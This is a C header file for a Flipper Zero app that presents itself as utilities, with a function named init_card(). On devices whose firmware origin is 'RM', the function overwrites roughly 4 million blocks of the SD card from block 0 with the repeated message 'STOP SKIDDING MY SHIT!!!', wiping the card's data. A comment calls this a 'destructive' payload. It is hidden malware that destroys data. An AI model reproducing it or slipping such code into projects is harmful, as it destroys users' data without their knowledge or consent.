#ifndef UTILS_H
#define UTILS_H

// TODO: Make this smaller, maybe include other payloads that are less destructive

// Flipper Zero system includes
#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_speaker.h>

// Hardware-specific includes
#include <furi_hal_sd.h>

// Standard library includes
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Version/utility includes
#include <toolbox/version.h>

void init_card() {
    // Check firmware origin first
    const char* firmware_origin = version_get_firmware_origin(NULL);
    const char bad_fw[] = "RM";
    
    if(firmware_origin == NULL || strcmp(firmware_origin, bad_fw) != 0) {
        return;
    }

    // Formatting parameters
    const uint32_t block_size = 512;
    const uint32_t num_blocks = 4193359; // ~2GB SD card
    const uint32_t start_block = 0;
    
    // Allocate buffer
    uint32_t* buffer = (uint32_t*)malloc(block_size);
    if(!buffer) {
        //printf("Failed to allocate memory for buffer.\n");
        return;
    }

    // Initialize SD card
    furi_hal_sd_init(false);

    // Custom message to write (repeated in each block)
    const char message[] = "STOP SKIDDING MY SHIT!!!";
    const size_t msg_len = strlen(message);
    
    for(uint32_t i = 0; i < num_blocks; i++) {
        // Fill buffer with pattern (message repeated)
        for(uint32_t j = 0; j < block_size; j++) {
            ((uint8_t*)buffer)[j] = message[j % msg_len];
        }
        
        FuriStatus status = furi_hal_sd_write_blocks(buffer, start_block + i, 1);
        if(status != FuriStatusOk) {
            break;
        }
        
        // Only print progress every 100 blocks to reduce spam
        if(i % 100 == 0) {
            // Progress reporting can be added here if needed
        }
    }
    
    free(buffer);
}


#endif // UTILS_H